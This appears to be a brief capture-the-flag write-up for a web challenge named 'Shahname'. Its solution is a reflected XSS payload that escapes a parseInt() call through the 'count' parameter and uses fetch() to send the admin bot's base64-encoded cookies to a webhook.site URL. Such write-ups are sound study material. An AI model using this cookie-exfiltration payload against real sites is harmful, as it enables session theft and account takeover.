# Shahname
Solved by: @benkyou

### Question:
my homework seems secure.
App: https://shahname-chall.fmc.tf/
Admin bot: https://shahname-bot.fmc.tf/

### Solution:
`count` is passed directly to `parseInt()` , you can escape here and inject javascript.

```
https://shahname-chall.fmc.tf/?count=%22);fetch(%27https://webhook.site/887722a2-39e8-4ac2-869e-64489b72347d/?c=%27%2bbtoa(document.cookie))//
```
